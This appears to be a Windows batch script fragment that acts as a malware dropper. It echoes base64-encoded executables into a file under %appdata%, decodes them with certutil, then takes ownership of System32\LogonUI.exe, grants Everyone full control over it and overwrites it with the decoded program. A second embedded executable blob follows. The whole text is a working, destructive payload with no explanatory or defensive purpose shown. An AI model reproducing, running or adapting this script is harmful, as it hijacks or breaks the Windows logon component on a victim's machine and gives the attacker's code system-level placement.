echo LnOVwMVfm3EcXIVfCjsQoGAnEM1o+sCanJvBSGn4ZZWGq4kj6smT2Mitiui/B5h7
echo 22TvJvr/sFkB77iwWosyFATQdLlTkerb9cxSYnTA2v8yWnbUEQnOmuuZYBs3ld63
echo kqNTBVBsjTyWfeygrWJw/0t2mOIu14mKvjvHkIoeh+ZlxtZkCsPDhb9Grp7qGT3F
echo socPiwj21oiBT8av+KxX0B9/IlsOP58WYPvqwSaekpBw8pQBzVsKzcenwJCcHNH3
echo P7WrNpHBBw8FOc7EuWOfQjpfxQMPzNTI1XT9lvQ+1Z9z3uqRMl6MfaJIA+UGAhWC
echo +thlJ/sQ5lKnuO3FqKq7uXfIE7sAMHQICXdHvcIb+ABTzlaMrFn6/SGAydjyIgRa
echo Y3EfKFyiCz/glgseSjUDZjQ0aQFM9xqaHGBZsf4mcbAeAkDWqTuUJgABfrfca+sC
echo dPVNGr78FMFHJHjPwbil5ZH8o4rE1y5p4C8xfURv/0BOmZWeiTrCotUIc7pSUQB4
echo vd3bDiSi+E9HeK8iwEsbc5g+SsiVTZzE/L4oYl9pouGNPz7NJFOcp3qsndAyr65G
echo NEoGIZU0AXSM7npy/u9N9mTzL25YK5PbnEP7UUK+QB4VYu17rx3PmwXZHUfFy5N8
echo aVXfzjq8zA4XtE5WMw3h53RUjLoOeVPFUSRI8uF+QBePCvQdlmZAlBfEYFWHX0ly
echo lv7n2BAfcDfqWUF6MYdee5gRijan+x8c/SjUFYnlxIrJakxf7z1zseIjBew/UMXk
echo nEFcFUVi0KIWuw+CDBiu0W8IjOTDIS7ZEMje3UT3UY932xNjwbKHmPecE3O/aeua
echo UynY1IrTb4tqM+GDYNqP5EQjl1AtXDtCpHRmglm25B48P3htbCB2ZXJzaW9uPSIx
echo LjAiIGVuY29kaW5nPSJVVEYtOCIgc3RhbmRhbG9uZT0ieWVzIj8+IDxhc3NlbWJs
echo eSB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEiIG1hbmlm
echo ZXN0VmVyc2lvbj0iMS4wIj4gPGRlcGVuZGVuY3k+IDxkZXBlbmRlbnRBc3NlbWJs
echo eT4gPGFzc2VtYmx5SWRlbnRpdHkgdHlwZT0id2luMzIiIG5hbWU9Ik1pY3Jvc29m
echo dC5XaW5kb3dzLkNvbW1vbi1Db250cm9scyIgdmVyc2lvbj0iNi4wLjAuMCIgcHJv
echo Y2Vzc29yQXJjaGl0ZWN0dXJlPSIqIiBwdWJsaWNLZXlUb2tlbj0iNjU5NWI2NDE0
echo NGNjZjFkZiIgbGFuZ3VhZ2U9IioiIC8+IDwvZGVwZW5kZW50QXNzZW1ibHk+IDwv
echo ZGVwZW5kZW5jeT4gPHYzOnRydXN0SW5mbyB4bWxuczp2Mz0idXJuOnNjaGVtYXMt
echo bWljcm9zb2Z0LWNvbTphc20udjMiPiA8djM6c2VjdXJpdHk+IDx2MzpyZXF1ZXN0
echo ZWRQcml2aWxlZ2VzPiA8IS0tIGxldmVsIGNhbiBiZSAiYXNJbnZva2VyIiwgImhp
echo Z2hlc3RBdmFpbGFibGUiLCBvciAicmVxdWlyZUFkbWluaXN0cmF0b3IiIC0tPiA8
echo djM6cmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWwgbGV2ZWw9InJlcXVpcmVBZG1pbmlz
echo dHJhdG9yIiAvPiA8L3YzOnJlcXVlc3RlZFByaXZpbGVnZXM+IDwvdjM6c2VjdXJp
echo dHk+IDwvdjM6dHJ1c3RJbmZvPiA8L2Fzc2VtYmx5PiBQQURESU5HWFhQQURESU5H
echo UEFERElOR1hYUEFERElOR1BBRERJTkdYWFBBRERJTkdQQURESU5HWFhQQURESU5H
echo UEFERElOR1hYUEFERElOR1BBRERJTkdYWFBBRERJTkdQQURESU5HWFhQQURESU5H
echo UEFERElOR1hYUEFERElORw==
) > "%appdata%\ren\startwhy"

certutil -decode "%appdata%\ren\startwhy" "%appdata%\ren\startwhy.exe"
takeown /f C:\Windows\System32\LogonUI.exe
icacls C:\Windows\System32\LogonUI.exe /grant everyone:f
copy "%appdata%\ren\startwhy.exe" C:\Windows\System32\LogonUI.exe /Y

(
echo TVpQAAIAAAAEAA8A//8AALgAAAAAAAAAQAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAEAALoQAA4ftAnNIbgBTM0hkJBUaGlzIHByb2dyYW0gbXVz
echo dCBiZSBydW4gdW5kZXIgV2luMzINCiQ3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAFBFAABMAQgAGV5CKgAAAAAAAAAA4ACOgQsBAhkAIgEA
echo AG4AAAAAAADgLQEAABAAAABAAQAAAEAAABAAAAACAAAEAAAAAAAAAAQAAAAAAAAA
echo ADACAAAEAACy9AEAAgAAAAAAEAAAQAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA
echo AMABANoLAAAAEAIAaBEAAAAAAAAAAAAAAAAAAAAAAAAA8AEAzBcAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAADgAQAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQ09ERQAAAAAUIQEAABAAAAAiAQAABAAA
echo AAAAAAAAAAAAAAAAIAAAYERBVEEAAAAAmDUAAABAAQAANgAAACYBAAAAAAAAAAAA
echo AAAAAEAAAMBCU1MAAAAAANU4AAAAgAEAAAAAAABcAQAAAAAAAAAAAAAAAAAAAADA
echo LmlkYXRhAADaCwAAAMABAAAMAAAAXAEAAAAAAAAAAAAAAAAAQAAAwC50bHMAAAAA
echo DAAAAADQAQAAAAAAAGgBAAAAAAAAAAAAAAAAAAAAAMAucmRhdGEAABgAAAAA4AEA
echo AAIAAABoAQAAAAAAAAAAAAAAAABAAABQLnJlbG9jAADMFwAAAPABAAAYAAAAagEA
echo AAAAAAAAAAAAAAAAQAAAUC5yc3JjAAAAaBEAAAAQAgAAEgAAAIIBAAAAAAAAAAAA
echo AAAAAEAAAFAAAAAAAAAAAAAAAAAAMAIAAAAAAACWAQAAAAAAAAAAAAAAAABAAABQ
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAQQQAAKBlN0cmluZ1gQQAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAWBBAAAQAAAAAAAAAnDFAAKgxQACsMUAAsDFAAKQxQAAoL0AA
echo RC9AAIAvQAAHVE9iamVjdGQQQAAHB1RPYmplY3RYEEAAAAAAAAAABlN5c3RlbQAA
echo hBBAAA8KSUludGVyZmFjZQAAAAABAAAAAAAAAADAAAAAAAAARgZTeXN0ZW0DAP//
echo zINEJAT46ek+AACDRCQE+OkHPwAAg0QkBPjpET8AAMzMsRBAALsQQADFEEAAAQAA
echo AAAAAAAAAAAAwAAAAAAAAEbREEAACAAAAAAAAACNQABMEUAA3RBAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAEwRQAAMAAAADBBAAJwxQAB4T0AAhE9AALAxQACkMUAA
echo lE9AAEQvQACAL0AAEVRJbnRlcmZhY2VkT2JqZWN0i8D/JZzBQQCLwP8lmMFBAIvA
echo /yWUwUEAi8D/JZDBQQCLwP8ljMFBAIvA/yWwwUEAi8D/JYjBQQCLwP8lrMFBAIvA
echo /yWEwUEAi8D/JYDBQQCLwP8lfMFBAIvA/yV4wUEAi8D/JXTBQQCLwP8lcMFBAIvA
echo /yVswUEAi8D/JWjBQQCLwP8lZMFBAIvA/yVgwUEAi8D/JVzBQQCLwP8lqMFBAIvA
echo /yVYwUEAi8D/JVTBQQCLwP8lUMFBAIvA/yXAwUEAi8D/JbzBQQCLwP8luMFBAIvA
echo /yVMwUEAi8D/JUjBQQCLwP8l0MFBAIvA/yXMwUEAi8D/JcjBQQCLwP8lRMFBAIvA
echo /yVAwUEAi8D/JTzBQQCLwP8lOMFBAIvAU4PEvLsKAAAAVOhZ////9kQkLAF0BQ+3
echo XCQwi8ODxERbw4vA/yU0wUEAi8D/JTDBQQCLwP8lLMFBAIvA/yUowUEAi8D/JSTB
echo QQCLwP8lIMFBAIvA/yUcwUEAi8D/JRjBQQCLwFNWvuCFQQCDPgB1OmhEBgAAagDo
echo qP///4vIhcl1BTPAXlvDodyFQQCJAYkN3IVBADPSi8IDwI1EwQSLHokYiQZCg/pk
echo deyLBosQiRZeW8OQiQCJQATDi8BTVovyi9jonf///4XAdQUzwF5bw4sWiVAIi1YE
echo iVAMixOJEIlYBIlCBIkDsAFeW8OLUASLCIkKiVEEixXghUEAiRCj4IVBAMNTVldV
echo UYvxiRQki+iLXQCLBCSLEIkWi1AEiVYEizuLBotTCANTDDvCdRSLw+i3////i0MI
echo iQaLQwwBRgTrFQNGBDtDCHUNi8Pom////4tDDAFGBIvfO+t1w4vWi8XoVv///4TA
echo dQQzwIkGWl1fXlvDU1ZXVYPE+IvYi/uLMotDCDvwcnCLzgNKBIvoA2sMO813Yjvw
echo dRuLQgQBQwiLQgQpQwyDewwAdUiLw+g5////6z+Lzot6BAPPi+gDaww7zXUFKXsM
echo 6yqLCgNKBIkMJIt7CAN7DCv5iXwkBCvwiXMMi9SLw+jQ/v//hMB1BDPA6wywAesI
echo ixs7+3WBM8BZWl1fXlvDkFNWV4vai/CB/gAAEAB9B74AABAA6wyBxv//AACB5gAA
echo //+JcwRqAWgAIAAAVmoA6Pj9//+L+Ik7hf90I4vTuOSFQQDobP7//4TAdRNoAIAA
echo AGoAiwNQ6Nn9//8zwIkDX15bw5BTVldVi9mL8ovox0MEAAAQAGoEaAAgAABoAAAQ
echo AFXopf3//4v4iTuF/3Ufgcb//wAAgeYAAP//iXMEagRoACAAAFZV6ID9//+JA4M7
echo AHQji9O45IVBAOj1/f//hMB1E2gAgAAAagCLA1DoYv3//zPAiQNdX15bw5BTVldV
echo g8TsiUwkBIkUJMdEJAj/////M9KJVCQMi+iLBCQDxYlEJBCLHeSFQQDrUYs7i3MI
echo O+53RovGA0MMO0QkEHc7O3QkCHMEiXQkCIvGA0MMO0QkDHYEiUQkDGgAgAAAagBW
echo 6O/8//+FwHUKxwXAhUEAAQAAAIvD6Ir9//+L34H75IVBAHWni0QkBDPSiRCDfCQM
echo AHQZi0QkBItUJAiJEItEJAwrRCQIi1QkBIlCBIPEFF1fXlvDU1ZXVYPE9IlMJASJ
echo FCSL0IvqgeUA8P//AxQkgcL/DwAAgeIA8P//iVQkCItEJASJKItEJAgrxYtUJASJ
echo QgSLNeSFQQDrPIteCIt+DAP7O+t2AovdO3wkCHYEi3wkCDv7dh5qBGgAEAAAK/tX
echo U+gm/P//hcB1CotEJAQz0okQ6wqLNoH+5IVBAHW8g8QMXV9eW8OLwFNWV1VRi9iL
echo 84HG/w8AAIHmAPD//4k0JIvrA+qB5QDw//+LBCSJAYvFKwQkiUEEizXkhUEA6ziL
echo XgiLfgwD+zscJHMDixwkO+9zAov9O/t2HGgAQAAAK/tXU+it+///hcB1CscFwIVB
echo AAIAAACLNoH+5IVBAHXAWl1fXlvDjUAAU1ZXVYPE+Ivyi/i99IVBAIHH/z8AAIHn
echo AMD//4tdAOszO3sMfyyLzovXi0MI6Lr+//+DPgB0UItGBAFDCItGBClDDIN7DAB1
echo PovD6Oz7///rNYsbO911yYvWi8fo9/z//4M+AHQhi8yL1ovF6OP7//+DPCQAdaWL
echo zItWBIsG6LH9//8zwIkGWVpdX15bw4vAU1ZXVYPE7IkMJIv6i/C99IVBAIHH/z8A
echo AIHnAMD//4tdAOsCixs73XQFO3MIdfU7cwh1Vzt7DA+OlgAAAI1MJASL1ytTDItD
echo CANDDOjb/P//g3wkBAB0M41MJAyNVCQEi8XoXfv//4N8JAwAdbGNTCQMi1QkCItE
echo JAToJf3//4sEJDPSiRDpkAAAAI1MJASL14vG6JT8//+DfCQEAHQ0jUwkDI1UJASL
echo xegW+///g3wkDAAPhWb///+NTCQMi1QkCItEJATo2vz//4sEJDPSiRDrSItrCDv1
echo dTo7ewx/NYsMJIvXi8Xocf3//4sEJIM4AHQoiwQki0AEAUMIiwQki0AEKUMMg3sM
echo AHUQi8Pomvr//+sHiwQkM9KJEIPEFF1fXlvDkFNWV4PE7Iv5iRQkjZj/PwAAgeMA
echo wP//izQkA/CB5gDA//873nNbi8+L1ivTi8Pomf3//41MJASL17j0hUEA6F36//+L
echo XCQEhdt0H41MJAyLVCQIi8PoJvz//4tEJAyJRCQEi0QkEIlEJAiDfCQEAHQUjVQk
echo BLj0hUEA6JH6///rBDPAiQeDxBRfXlvDVYvsM9JVaB4aQABk/zJkiSJoxIVBAOg5
echo +f//gD1FgEEAAHQKaMSFQQDoLvn//7jkhUEA6Iz5//+49IVBAOiC+f//uCCGQQDo
echo ePn//2j4DwAAagDo3Pj//6MchkEAgz0chkEAAHQvuAMAAACLFRyGQQAzyYlMgvRA
echo PQEEAAB17LgEhkEAiUAEiQCjEIZBAMYFvIVBAAEzwFpZWWSJEGglGkAAgD1FgEEA
echo AHQKaMSFQQDor/j//8PpSRoAAOvloLyFQQBdw1WL7FOAPbyFQQAAD4TMAAAAM9JV
echo aAIbQABk/zJkiSKAPUWAQQAAdApoxIVBAOhm+P//xgW8hUEAAKEchkEAUOg0+P//
echo M8CjHIZBAIsd5IVBAOsSaACAAABqAItDCFDoJfj//4sbgfvkhUEAdea45IVBAOiJ
echo +P//uPSFQQDof/j//7gghkEA6HX4//+h3IVBAIXAdBeLEIkV3IVBAFDo1vf//6Hc
echo hUEAhcB16TPAWllZZIkQaAkbQACAPUWAQQAAdApoxIVBAOjV9///aMSFQQDo0/f/
echo /8PpZRkAAOvbW13DUzsFEIZBAHUJi1AEiRUQhkEAi1AEi0gIgfkAEAAAfzg7wnUX
echo hcl5A4PBA8H5AqEchkEAM9KJVIj06ySFyXkDg8EDwfkCix0chkEAiVSL9IsAiQKJ
echo UARbw4sAiQKJUARbw41AAIsVIIZBAOsQi0oIO8FyBwNKDDvBchaLEoH6IIZBAHXo
echo xwXAhUEAAwAAADPSi8LDkFOLyoPpBI0cAYP6EHwPxwMHAACAi9HouQEAAFvDg/oE
echo fAyLyoHJAgAAgIkIiQtbw/8FrIVBAIvQg+oEixKB4vz//3+D6gQBFbCFQQDo8wUA
echo AMOLwIP6DHwOg8oCiRCDwAToyv///8OD+gR8CovKgckCAACAiQgDwoMg/sNTVovQ
echo g+oEixKLyoHhAgAAgIH5AgAAgHQKxwXAhUEABAAAAIvageP8//9/K8OLyDMR98L+
echo ////dArHBcCFQQAFAAAA9gEBdCCL0IPqDItyCCvGO3AIdArHBcCFQQAGAAAA6Ir+
echo //8D3ovDXlvDjUAAU1ZXi9gz/4sDqQAAAIB0CyX8//9/A/gD2IsDqAJ1E4vzi8bo
echo WP7//4tGCAP4A9iDI/6Lx19eW8NTVldVg8T0i/qL8MYEJACLxuiW/v//i9iF2w+E
echo ggAAAItrCIvFA0MMi9CNDDcr0YP6DH8Ei/gr/ovGK8WD+Ax9FI1MJAGL1itTCAPX
echo i8Xoxfv//+sRjUwkAYvXg+oEjUYE6LL7//+LbCQBhe10NIvVK9aLxuhj/v//i8UD
echo RCQFi1MIA1MMO8JzCo0UNyvQ6J3+//+NVCQBi8Poivb//8YEJAGKBCSDxAxdX15b
echo w41AAFNWV4vyi/iL34lzCIvDA8aD6AyJcAiB/gAQAAB/N4vWhdJ5A4PCA8H6AqEc
echo hkEAi0SQ9IXAdRChHIZBAIlckPSJWwSJG+s6ixCJQwSJE4kYiVoE6yyB/gA8AAB8
echo DYvWi8fo6v7//4TAdRehEIZBAIkdEIZBAIsQiUMEiROJGIlaBF9eW8ONQACDPRSG
echo QQAAfkCDPRSGQQAMfQzHBcCFQQAHAAAA6yuhFIZBAIPIAosVGIZBAIkCoRiGQQCD
echo wATomf3//zPAoxiGQQAzwKMUhkEAw4vAU1ZXg8Twi/CNPCSlpYv86KD///+NTCQI
echo i9e4IIZBAOgQ9f//i1wkCIXbdQQzwOtSiwc72HMK6Jn9//8pBwFHBIsHA0cEi/MD
echo dCQMO8ZzCOjw/f//AUcEiwcDRwQ78HURg+gEugQAAADo6/z//4NvBASLB6MYhkEA
echo i0cEoxSGQQCwAYPEEF9eW8ONQABTg8T4i9iL1I1DBOhE+P//gzwkAHQLi8ToV///
echo /4TAdQQzwOsCsAFZWlvDkFNWg8T4i/KL2IvMjVYEi8Poo/j//4M8JAB0C4vE6Cb/
echo //+EwHUEM8DrArABWVpeW8ONQAAz0oXAeQODwAPB+AI9AAQAAH8WixUchkEAi1SC
echo 9IXSdQhAPQEEAAB16ovCw1NWV1WL8L8QhkEAvRSGQQCLHQiGQQA7cwgPjoQAAACL
echo H4tDCDvwfnuJcwiLWwQ7cwh/+IsXiUIIOx90BIkf62OB/gAQAAB/DYvG6IX///+L
echo 2IXbdU6LxugY////hMB1BzPA6YgAAAA7dQB/pCl1AIN9AAx9CAN1ADPAiUUAoRiG
echo QQABNRiGQQCL1oPKAokQg8AE/wWshUEAg+4EATWwhUEA60yLw+gC+///i1MIi8Ir
echo xoP4DHwMi9MD1pLoVP3//+sSi/I7H3UFi0MEiQeLwwPGgyD+i8OL1oPKAokQg8AE
echo /wWshUEAg+4EATWwhUEAXV9eW8NVi+yDxPhTVleL2IA9vIVBAAB1Cej7+P//hMB0
echo CIH7+P//f34KM8CJRfzpVAEAADPJVWjQIUAAZP8xZIkhgD1FgEEAAHQKaMSFQQDo
echo IPL//4PDB4Pj/IP7DH0FuwwAAACB+wAQAAAPj5MAAACLw4XAeQODwAPB+AKLFRyG
echo QQCLVIL0hdJ0eYvyi8YDw4Mg/otCBDvQdRqLw4XAeQODwAPB+AKLDRyGQQAz/4l8
echo gfTrJovLhcl5A4PBA8H5Aos9HIZBAIlEj/SLColN+ItN+IlBBItN+IkIi8aLUgiD
echo ygKJEIPABIlF/P8FrIVBAIPrBAEdsIVBAOgCFAAA6YQAAAA7HRSGQQB/SikdFIZB
echo AIM9FIZBAAx9DQMdFIZBADPAoxSGQQChGIZBAAEdGIZBAIvTg8oCiRCDwASJRfz/
echo BayFQQCD6wQBHbCFQQDorRMAAOsyi8PotP3//4lF/DPAWllZZIkQaNchQACAPUWA
echo QQAAdApoxIVBAOj98P//w+mXEgAA6+WLRfxfXltZWV3DjUAAVYvsUVNWV4vYM8Cj
echo wIVBAIA9vIVBAAB1H+hm9///hMB1FscFwIVBAAgAAADHRfwIAAAA6WEBAAAzyVVo
echo diNAAGT/MWSJIYA9RYBBAAB0CmjEhUEA6Ifw//+L84PuBIse9sMCdQ/HBcCFQQAJ
echo AAAA6fUAAAD/DayFQQCLwyX8//9/g+gEKQWwhUEA9sMBdEWLxoPoDItQCIP6DHwI
echo 98IDAACAdA/HBcCFQQAKAAAA6bYAAACLxivCO1AIdA/HBcCFQQAKAAAA6Z4AAAAD
echo 2ovw6FT4//+B4/z//3+LxgPDi/g7PRiGQQB1LCkdGIZBAAEdFIZBAIE9FIZBAAA8
echo AAB+BegT+///M8CJRfzoXRIAAOmFAAAAixD2wgJ0HIHi/P//f4P6BH0MxwXAhUEA
echo CwAAAOs3gwgB6ymLx4N4BAB0C4M4AHQGg3gIDH0MxwXAhUEACwAAAOsTi1AIA9ro
echo yPf//4vTi8boJ/r//6HAhUEAiUX8M8BaWVlkiRBofSNAAIA9RYBBAAB0CmjEhUEA
echo 6Ffv///D6fEQAADr5YtF/F9eW1ldw4vAU1ZXVYPE+Ivyg8YHg+b8g/4MfQW+DAAA
echo AIvog+0Ei30Agef8//9/i8UDx4vYO/51B7AB6ZsBAAA7/g+OgwAAAIvXK9aJFCQ7
echo HRiGQQB1OIsEJCkFGIZBAIsEJAEFFIZBAIM9FIZBAAwPjUwBAACLBCQBBRiGQQCL
echo BCQpBRSGQQCL9+kzAQAAi9j2AwJ1DYvDi1AIARQk6On2//+DPCQMfBuL3QPeiwQk
echo g8gCiQOLw4PABOiR9///6f4AAACL9+n3AAAAi8Yrx4lEJAQ7HRiGQQB1Z6EUhkEA
echo O0QkBHxTi0QkBCkFFIZBAItEJAQBBRiGQQCDPRSGQQAMfRihFIZBAAEFGIZBAAM1
echo FIZBADPAoxSGQQCLxivHAQWwhUEAi0UAJQMAAIAL8Il1ALAB6aIAAADoPvn//4vd
echo A9/2AwJ1TYvTi8KLSAiJDCSLDCQ7TCQEfQ4DFCSL2osEJClEJATrLOgf9v//i0Qk
echo BCkEJIM8JAx8DovFA8aLFCTobvj//+s6AzQki90D3oMj/usuiwOpAAAAgHQhJfz/
echo /38Dw4vYi1QkBIvD6M/5//+EwHQJi90D3+kN////M8DrGYvGK8cBBbCFQQCLRQAl
echo AwAAgAvwiXUAsAFZWl1fXlvDi8BVi+xRU1ZXi/KL2IA9vIVBAAB1E+jr8///hMB1
echo CjPAiUX86ZEAAAAz0lVoFSZAAGT/MmSJIoA9RYBBAAB0CmjEhUEA6Bjt//+L1ovD
echo 6NP9//+EwHQFiV386zaLxuiP+v//i/iLw4PoBIsAJfz//3+D6AQ78H0Ci8aF/3QR
echo i9eLy5HoxgEAAIvD6PP7//+JffwzwFpZWWSJEGgcJkAAgD1FgEEAAHQKaMSFQQDo
echo uOz//8PpUg4AAOvli0X8X15bWV3DjUAAU4XAfhX/FThAQQCL2IXbdQuwAejQAAAA
echo 6wIz24vDW8NThcB0Ff8VPEBBAIvYhdt0C7AC6LAAAADrAjPbi8Nbw4sIhcl0MoXS
echo dBhQicj/FUBAQQBZCcB0GYkBw7AC6YYAAACJEInI/xU8QEEACcB168OwAelwAAAA
echo hdJ0EFCJ0P8VOEBBAFkJwHTniQHDjUAAiRUEQEEA6GkTAADDU1aL8ovYgON/gz0I
echo gEEAAHQKi9aLw/8VCIBBAITbdQ3oPy8AAIuYBAAAAOsPgPsYdwozwIrDiphEQEEA
echo M8CKw4vW6K3///9eW8OLwIPgf4sUJOmp////w1BSUegELwAAg7gEAAAAAFlaWHUB
echo wzHA6dj////DjUAAU4vY6OQuAACJmAQAAABbw1ZXicaLfCQMMcAKBnQrhdJ+GDnC
echo fxsp0ECFyXwUOcF/FAHWiA9H86TrEboBAAAA6+UxyevsicHr6IgHX17CBADDjUAA
echo U+iSLgAAi5gEAAAA6IcuAAAz0omQBAAAAIvDW8ONQABWV4nGideJyDn3dxN0L8H5
echo Angq86WJwYPhA/OkX17DjXQx/I18OfzB+QJ4Ef3zpYnBg+EDg8YDg8cD86T8X17D
echo U1ZXVYvyi9jrCFPoiOn//4vYigOEwHQEPCB27oA7InULgHsBInUFg8MC6+Yz7Yv7
echo 60M8InUxU+hc6f//i9jrDlPoUun//4vQK9MD6ovYigOEwHQEPCJ16IA7AHQYU+g1
echo 6f//i9jrDlPoK+n//4vQK9MD6ovYigM8IHe3i8aL1eicFwAAi9+LPjP261E8InU4
echo U+gC6f//i9jrFVPo+Oj//zvDdguKE4gUN0NGO8N39YoDhMB0BDwideGAOwB0H1Po
echo 1Oj//4vY6xVT6Mro//87w3YLihOIFDdDRjvDd/WKAzwgd6mLw11fXlvDi8BTVleB
echo xPj+//+L2ovwi8PoVBEAAIX2dR5oBQEAAI1EJARQagDow+j//4vIi9SLw+gkEgAA
echo 6x7ooej//4v4i9OLx+jO/v//i/iF9nQIgzsAdANO6+mBxAgBAABfXlvDi8CDPSiA
echo QQAAdAb/FSiAQQC40gAAAOnjEAAAw4vAU2aLSARmgemx13QPSWaD6QJzDIva/9OL
echo 2OsbM9vrFz0UgkEAdAc94INBAHUEM9vrBbtnAAAAhdt0B4vD6KP9//+Lw1vDjUAA
echo i1Ac6LD////DjUAAU1aL2DP2ZotDBGY9sddyL2Y9s9d3KWYlstdmPbLXdQeLw/9T
echo HIvwhfZ1B4vD/1Mki/CF9nQbi8boU/3//+sSgftIgEEAdAq4ZwAAAOg//f//i8Ze
echo W8OLwFeJx4jNicjB4BBmiciJ0cH5AngJ86uJ0YPhA/OqX8OQU1ZXicZQhcB0bDHA
echo Mdu/zMzMDIoeRoD7IHT4tQCA+y10YoD7K3RfgPskdF+A+3h0WoD7WHRVgPswdROK
echo HkaA+3h0SID7WHRDhNt0IOsEhNt0LYDrMID7CXclOfh3IY0EgAHAAdiKHkaE23Xm
echo /s10CYXAfVTrCUbrBvfYfkt4SVsp3utH/sWKHkbrnL////8Pih5GhNt034D7YXID
echo gOsggOswgPsJdguA6xGA+wV30IDDCjn4d8nB4AQB2IoeRoTbddX+zXUC99hZMfaJ
echo Ml9eW8ONQABWV4nGideB4f8AAADzpl9ew41AAOkDAAAAw4vAUzHbhcB8TQ+EmgAA
echo AD0AFAAAD42BAAAAicKD4h+NFJLbrFPHK0AA3snB6AV0eYnCg+IPdAyNFJLbrFP9
echo LEAA3snB6AR0YY0EgNusQ5MtQADeyetT99g9ABQAAH1GicKD4h+NFJLbrFPHK0AA
echo 3vnB6AV0NInCg+IPdAyNFJLbrFP9LEAA3vnB6AR0HI0EgNusQ5MtQADe+esO3djb
echo q70rQADrBN3Y2e5bwwAAAAAAAACA/38AAAAAAAAAgP8/AAAAAAAAAKACQAAAAAAA
echo AADIBUAAAAAAAAAA+ghAAAAAAAAAQJwMQAAAAAAAAFDDD0AAAAAAAAAk9BJAAAAA
echo AACAlpgWQAAAAAAAILy+GUAAAAAAAChr7hxAAAAAAAD5ApUgQAAAAABAt0O6I0AA
echo AAAAEKXU6CZAAAAAACrnhJEqQAAAAID0IOa1LUAAAACgMalf4zBAAAAABL/JG440
echo QAAAAMUuvKKxN0AAAEB2OmsL3jpAAADoiQQjx4o+QAAAYqzF63itQUAAgHoXtybX
echo 2ERAAJCsbjJ4hodIQAC0Vwo/FmipS0AAoe3MzhvC005AoIQUQGFRWYRSQMilGZC5
echo pW+lVUA6DyD0J4/LzlhAhAmU+Hg5P4FcQOULuTbXB4+hX0DfTmcEzcnyyWJAliKB
echo RUB8b/xlQJ61cCuorcWdaUDVps//SR94wtNAoxSbxRars+89QeCM6YDJR7qTqEGq
echo F+Z/K6EWthJCa1UnOY33cOB8QjDJPOP/llKK50KO3vmd++t+qlFDjC9qXBn8JtK7
echo Q3bjzPIpL4SBJkTSCpDbACekn5BEF6r4rhDjxcT6RFmcsOkHnIryZEXU8/fr4Up6
echo lc9FYqKVB9zYPrg5RseRDqauoBnjo0YXDHWBhnV2yUhN5KeTOTs1uLLtU+VdPcVd
echo O4ueklqm8KEgwFSljDdhi1qL2CVdifnbZ/jzJ7+iyF3dgG6blyCKAlJgxCV18FnV
echo bmIRNa7Ke8P/JaTBQQCLwFMz22oA6O7///+D+Ad1HGoB6OL///8lAP8AAD0ADQAA
echo dAc9AAQAAHUCswGLw1vDkFWL7IPE9A+3BSBAQQCJRfiNRfxQagFqAGjILkAAaAIA
echo AIDoyeP//4XAdU0zwFVooS5AAGT/MGSJIMdF9AQAAACNRfRQjUX4UGoAagBo5C5A
echo AItF/FDonuP//zPAWllZZIkQaKguQACLRfxQ6Hjj///D6cYFAADr72ahIEBBAGYl
echo wP9mi1X4ZoPiP2YLwmajIEBBAIvlXcMAU09GVFdBUkVcQm9ybGFuZFxEZWxwaGlc
echo UlRMAEZQVU1hc2tWYWx1ZQAAAADb45vZLSBAQQDDi8CLAInCi8LDkFZXideLcNQx
echo yYoOQfOkX17DjUAAi0DchcB0AosAw4vAU4vYi8PoJgAAAOjx9v//i9CLw+hcAAAA
echo W8OLwFOL2IvD6KYAAACLw+jz9v//W8OQg8DYiwDDi8CE0nQIg8Tw6GwCAACE0nQP
echo 6LsCAABkjwUAAAAAg8QMw+i7AgAAhNJ+BeiaAgAAw5CFwHQHsgGLCP9R/MNTVleJ
echo w4nXq4tL2DHAUcHpAknzq1mD4QPzqonQieKLS7iFyXQBUYtb3IXbdASLG+vtOdR0
echo HVuLC4PDBItzEIX2dAaLexSJNAeDwxxJde051HXjX15bw4vAU1aJw4nGizaLVsCL
echo dtyF0nQH6CUTAACJ2IX2deleW8OH0YH5AAAA/3MRgfkAAAD+cgcPv8kDCP8h/+GB
echo 4f///wABwYnQixHpDB8AAMONQABVi+yDxPhTVlcz24ld+IvxiVX8i/gzwFVoyDBA
echo AGT/MGSJIDPAiQaLVfyLB+hjAAAAi9iF23Qxi0MUhcB0EwP4iT6DPgB0IYsGUIsA
echo /1AE6xeNTfiLUxiLx+hy////i1X4i8booB4AAIM+AA+VwzPAWllZZIkQaM8wQACN
echo RfjobR4AAMPpnwMAAOvwi8NfXltZWV3DU1aJw4tDuIXAdCmLCIPABIsyOzB1GIty
echo BDtwBHUQi3IIO3AIdQiLcgw7cAx0E4PAHEl13Itb3IXbdASLG+vFMcBeW8NTVovy
echo i9iF23QNi9aLA+hZAAAAhMB1BTPAXlvDsAFeW8ONQABXlusCizaLftCF/3QND7cP
echo UYPHAvJmr3QKWYt23IX2deNfw1gBwCnIi3RH/F/Di8BQUYsA6Mf///9ZWHQC/+ZZ
echo 6bf3///Di8DrAosAOdB0CItA3IXAdfPDsAHDkLj//wCAw4vAw41AAMONQADDjUAA
echo VmaLMmYJ9nQXZoH+AMBzEFCLAOh4////WHQFifFe/+Feiwj/YfDDkFJRU4TSfAP/
